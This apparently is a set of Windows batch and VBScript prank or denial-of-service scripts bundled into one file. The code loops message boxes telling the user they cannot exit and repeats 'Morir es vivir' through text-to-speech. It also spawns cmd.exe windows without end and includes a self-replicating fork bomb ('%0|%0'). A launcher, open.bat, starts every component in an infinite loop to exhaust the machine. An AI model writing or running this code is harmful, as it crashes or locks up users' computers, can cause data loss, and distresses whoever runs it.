@echo off

REM Bloque de código para c1.vbs
do
Mensaje=msgbox("Hola" ,16, "Mensaje")
Mensaje=msgbox("¿Qué haces?" ,16, "Mensaje")
Mensaje=msgbox("Quieres salir?" ,16, "Mensaje")
Mensaje=msgbox("Estas segur@?" ,16, "Mensaje")
Mensaje=msgbox("Pero no puedes" ,16, "Mensaje")
Message=msgbox("Hello" ,16, "Message")
Message=msgbox("What are you doing?" ,16, "Message")
Message=msgbox("Do you want to exit?" ,16, "Message")
Message=msgbox("Are you sure?" ,16, "Message")
Message=msgbox("But you can't" ,16, "Message")
Message=msgbox("Salve" ,16, "Messagium")
Message=msgbox("Quid facis?" ,16, "Messagium")
Message=msgbox("Visne exire?" ,16, "Messagium")
Message=msgbox("Certus es?" ,16, "Messagium")
Message=msgbox("Sed non potes" ,16, "Messagium")
Message=msgbox("Привет" ,16, "Сообщение")
Message=msgbox("Что ты делаешь?" ,16, "Сообщение")
Message=msgbox("Хочешь выйти?" ,16, "Сообщение")
Message=msgbox("Ты уверен(а)?" ,16, "Сообщение")
Message=msgbox("Но ты не можешь" ,16, "Сообщение")
Message=msgbox("你好" ,16, "消息")
Message=msgbox("你在做什么？" ,16, "消息")
Message=msgbox("你想退出吗？" ,16, "消息")
Message=msgbox("你确定吗？" ,16, "消息")
Message=msgbox("但你不能" ,16, "消息")
loop

REM Bloque de código para d2.vbs
do
Dim var1, var2 
var1="Hola ,Hola ,Hola....Morir es vivir"
Set va2=CreateObject("sapi.spvoice")
va2.Speak var1
loop

REM Bloque de código para f3.bat
:bucle
echo off 
start cmd.exe
goto bucle

REM Bloque de código para g4.vbs
Set Sound = CreateObject("WMPlayer.OCX.7")
Sound.URL = "Grotesco.mp3"
Sound.Controls.play
do while Sound.currentmedia.duration = 0
wscript.sleep 800
loop
wscript.sleep (int(Sound.currentmedia.duration)+1)*1000

REM Bloque de código para g4.bat
@echo off
:bucle 
start g4.vbs
goto bucle

REM Bloque de código para h5.bat
@echo off
:imgx
start huevosad.jpg
goto imgx

REM Bloque de código para i6.bat
start "" %0

REM Bloque de código para l7.bat
%0|%0

REM Bloque de código para open.bat
@echo off
:bucle 
start c1.vbs
start d2.vbs
start f3.bat
start g4.bat
start h5.bat
start i6.bat
start l7.bat
goto bucle
